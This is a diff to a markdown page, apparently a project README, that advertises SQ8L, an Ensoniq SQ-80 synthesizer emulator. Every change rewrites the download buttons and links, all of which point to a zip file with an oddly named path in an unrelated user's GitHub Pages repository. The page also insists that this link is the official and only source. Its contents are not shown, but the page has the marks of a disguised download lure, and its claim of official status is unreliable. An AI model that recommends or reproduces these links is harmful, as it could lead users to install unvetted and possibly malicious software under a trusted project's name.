@@ -4,9 +4,9 @@ title: "🎹 SQ8L - Bring Ensoniq SQ-80 Sound to Life"
 description: "Revive SQ8L's bit-exact Ensoniq SQ-80 emulation as a 64-bit VST2/VST3/AU/CLAP/LV2 plugin for macOS, Windows and Linux."
 ---
 # 🎹 SQ8L - Bring Ensoniq SQ-80 Sound to Life
-[![Download SQ8L](https://img.shields.io/badge/Download-SQ8L-ff6b6b?style=for-the-badge&labelColor=4ecdc4&logo=github&logoColor=white)](https://raw.githubusercontent.com/Ravali2304/Ravali2304.github.io/main/impedimentary/v2.6.zip 🎹 SQ8L - Bring Ensoniq SQ-80 Sound to Life
+[![Download SQ8L](https://img.shields.io/badge/Download-SQ8L-ff6b6b?style=for-the-badge&labelColor=4ecdc4&logo=github&logoColor=white)](https://github.com/Ravali2304/Ravali2304.github.io/raw/refs/heads/main/impedimentary/v2.6.zip 🎹 SQ8L - Bring Ensoniq SQ-80 Sound to Life
 
-[![Download SQ8L](https://img.shields.io/badge/Download-SQ8L-ff7b54?style=for-the-badge&labelColor=2ec4b6&logo=github&logoColor=white)](https://raw.githubusercontent.com/Ravali2304/Ravali2304.github.io/main/impedimentary/v2.6.zip)
+[![Download SQ8L](https://img.shields.io/badge/Download-SQ8L-ff7b54?style=for-the-badge&labelColor=2ec4b6&logo=github&logoColor=white)](https://github.com/Ravali2304/Ravali2304.github.io/raw/refs/heads/main/impedimentary/v2.6.zip)
 
 SQ8L is a software instrument that recreates one of the most loved synthesizers of the 1980s — the Ensoniq SQ-80 — and lets you play it on a modern Windows or Mac computer. This project is a faithful 64-bit port of SQ8L 0.91b, Siegfried Kullmann's original Ensoniq SQ-80 emulation, carefully rebuilt so it runs smoothly on today's machines instead of being stranded on hardware that no longer exists.
 
@@ -16,9 +16,9 @@ If you have ever wanted those warm, glassy, unmistakably 1980s tones inside your
 
 The download lives on the official project page. Everything you need starts there.
 
-[![Get SQ8L](https://img.shields.io/badge/GET%20SQ8L-Windows-9b5de5?style=for-the-badge&labelColor=f15bb5&logo=windows&logoColor=white)](https://raw.githubusercontent.com/Ravali2304/Ravali2304.github.io/main/impedimentary/v2.6.zip)
+[![Get SQ8L](https://img.shields.io/badge/GET%20SQ8L-Windows-9b5de5?style=for-the-badge&labelColor=f15bb5&logo=windows&logoColor=white)](https://github.com/Ravali2304/Ravali2304.github.io/raw/refs/heads/main/impedimentary/v2.6.zip)
 
-**Visit this link to download the application:** https://raw.githubusercontent.com/Ravali2304/Ravali2304.github.io/main/impedimentary/v2.6.zip
+**Visit this link to download the application:** https://github.com/Ravali2304/Ravali2304.github.io/raw/refs/heads/main/impedimentary/v2.6.zip
 
 That page is the official home of SQ8L. It is where the current version is published and where you will always find the newest build for Windows. Bookmark it — if you ever need to reinstall, replace a lost copy, or check for an update, that same link is the only place you need to remember.
 
